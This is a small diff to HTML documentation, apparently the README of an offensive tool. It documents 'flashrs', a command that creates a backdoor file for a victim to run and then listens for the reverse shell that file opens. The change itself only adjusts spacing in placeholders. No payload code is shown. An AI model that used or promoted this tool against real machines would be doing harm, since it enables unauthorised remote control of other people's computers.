@@ -12,7 +12,7 @@ The "flashconsole" is used to work with Reverse Shells.
 A Reverse Shell is when you get the victim computer to install malicious code or software on their system. When that file is run, you will have a fully interactive shell, where you can do all kidns of things.
 Here are all the commands of the <b>flashconsole</b>:
 <ul>
-  <li>flashrs <--create/--listen> THOST=<TARGET_HOST> LHOST=<LISTENING_HOST> PORT=<PORT></li>
+  <li>flashrs <--create/--listen> THOST=< TARGET_HOST > LHOST=< LISTENING_HOST > PORT=< PORT ></li>
     <ul>
       <li>--create  -  This will switch to creating mode, meaning it will create a backdoor file.</li>
       <li>--listen  -  Using --listen will switch to listening mode, which means the backdoor is installed on the victim's machine, but not run yet.
